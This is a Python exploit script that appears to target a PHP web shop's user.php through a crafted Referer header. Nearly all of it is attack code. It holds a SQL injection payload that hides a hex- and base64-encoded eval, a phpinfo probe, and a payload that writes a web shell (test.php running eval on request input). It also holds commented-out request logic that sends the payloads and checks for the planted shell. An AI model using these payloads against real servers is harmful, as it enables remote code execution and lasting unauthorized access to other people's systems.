import requests,time


class Exploit:

    def __init__exp(self):

        exp1 = '554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:"id";s:3:"'"'"'/*";s:3:"num";s:201:"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--";s:4:"name";s:3:"ads";}554fcae493e564ee0dc75bdf2ebf94ca'
        url1 = {"action":"login", "vulnspy":"phpinfo();exit;"}


        url2 = {"action":"login", "vulnspy":"eval(base64_decode($_POST[d]));exit;", "d":"ZmlsZV9wdXRfY29udGVudHMoJ3Rlc3QucGhwJywnPD9waHAgZXZhbCgkX1JFUVVFU1RbdGVzdF0pOz8=%2BJyk7"}
        return [exp1, url1, url2]

    def attack(self, url):
        # flag = False
        # res1 = requests.post(url + "/user.php", headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0','Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3','Referer':self.__init__exp()[0],'Accept-Encoding': 'gzip, deflate'}, data=self.__init__exp()[1]).text
        #
        # if res1 in res1:
        #     str = "the {} is bug ! ".format(url)
        #     flag = True
        #     res2 = requests.post(url + "/user.php", headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0','Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3','Referer':self.__init__exp()[0],'Accept-Encoding': 'gzip, deflate'}, data=self.__init__exp()[2]).text
        #
        #     if requests.get(url+"/test.php"): str += " whe webshell is found {}".format(url+"/test.php")
        #     return str
        pass

